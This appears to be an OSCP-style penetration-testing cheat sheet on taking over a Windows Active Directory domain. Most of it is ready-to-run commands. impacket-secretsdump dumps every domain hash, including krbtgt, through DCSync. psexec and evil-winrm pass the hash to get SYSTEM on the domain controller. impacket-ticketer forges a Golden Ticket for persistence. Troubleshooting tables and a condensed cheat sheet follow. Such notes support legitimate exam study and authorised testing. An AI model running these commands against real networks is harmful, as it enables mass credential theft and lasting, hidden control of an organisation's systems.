# 🏰 DCSync & Domain Dominance

> The endgame. With DCSync rights (or Domain Admin), pull **every hash in the domain** from the DC — including **krbtgt** — then pass-the-hash the Administrator account and/or forge a **Golden Ticket** for persistence. This is "own the domain."

Part of [[Active Directory]]. Related: [[AD ACL Abuse]] · [[Dumping Windows Hashes]] · [[Pass-the-Hash]] · [[Credential Reuse]]

---

## 🧠 THINK
- **DCSync** needs `GetChanges` + `GetChangesAll` (Domain Admins have it; grantable via [[AD ACL Abuse]] WriteDACL).
- Dump **NTDS** = all domain user hashes → PtH the DA/Administrator.
- **krbtgt** hash → **Golden Ticket** = forge any user's TGT (exam persistence / cross-host access).
- On OSCP, dumping NTDS + PtH Administrator to the DC is usually the proof-grabbing finale.

## 💥 DCSYNC / NTDS DUMP
Everything (needs DCSync rights / DA):
```bash
impacket-secretsdump $DOMAIN/$U:$P@$DC
```
Just krbtgt (for a Golden Ticket):
```bash
impacket-secretsdump $DOMAIN/$U:$P@$DC -just-dc-user krbtgt
```
Via netexec:
```bash
netexec smb $DC -u $U -p $P --ntds
```

## 💥 PASS-THE-HASH THE DC
```bash
impacket-psexec -hashes :<admin-NThash> Administrator@$DC
```
```bash
evil-winrm -i $DC -u Administrator -H <admin-NThash>
```
→ SYSTEM on the DC → grab proof.

## 💥 GOLDEN TICKET (persistence)
Need: krbtgt NT hash + domain SID (`impacket-lookupsid` or from secretsdump output).
```bash
impacket-ticketer -nthash <krbtgt-hash> -domain-sid <SID> -domain $DOMAIN Administrator
```
```bash
export KRB5CCNAME=Administrator.ccache
```
```bash
impacket-psexec -k -no-pass $DOMAIN/Administrator@dc01.$DOMAIN
```

## 🔁 FOUND → NEXT
| FINDING | NEXT |
|---|---|
| DCSync rights / DA | secretsdump → all hashes |
| Administrator NT hash | PtH to DC → SYSTEM → proof |
| krbtgt hash + SID | Golden Ticket → any user, anywhere |
| NTDS dumped | crack/reuse remaining hashes across the forest |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| secretsdump "access denied" | you lack DCSync — grant via WriteDACL ([[AD ACL Abuse]]) or escalate first |
| PtH to DC fails | verify hash + Administrator name; try wmiexec; check FQDN/clock |
| Golden ticket rejected | correct SID + krbtgt hash; sync clock; use FQDN + `-k` |
| Only some hashes | you may only have partial rights — re-check BloodHound path |

## 📇 CHEAT SHEET
```bash
impacket-secretsdump $DOMAIN/$U:$P@$DC                       # NTDS (all hashes)
```
```bash
impacket-psexec -hashes :<admin-hash> Administrator@$DC       # PtH -> SYSTEM on DC
```
```bash
impacket-ticketer -nthash <krbtgt> -domain-sid <SID> -domain $DOMAIN Administrator   # Golden
```
**Kill shot:** DCSync → NTDS → PtH Administrator to the DC → domain owned (+ Golden Ticket for persistence).
